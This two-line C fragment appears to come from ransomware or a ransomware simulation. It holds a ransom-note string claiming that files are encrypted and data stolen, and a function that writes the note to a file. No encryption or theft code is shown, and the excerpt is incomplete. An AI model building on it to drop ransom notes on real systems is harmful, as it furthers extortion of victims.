const char *note="All files have been encrypted and valuable data stolen.";
void notify(){WriteFile(file,note,strlen(note),&written,0);}
